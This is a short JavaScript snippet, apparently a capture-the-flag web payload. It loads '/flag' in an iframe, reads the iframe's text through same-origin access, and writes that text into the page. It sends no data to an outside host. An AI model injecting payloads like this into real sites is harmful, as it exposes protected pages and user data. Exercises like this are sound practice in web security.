var i = document.createElement("iframe");
i.src = "/flag";
i.onload = function() {
    try {
        var text = i.contentDocument.body.innerText;
        document.body.innerText = text;
    } catch(e) {}
};
document.body.appendChild(i);
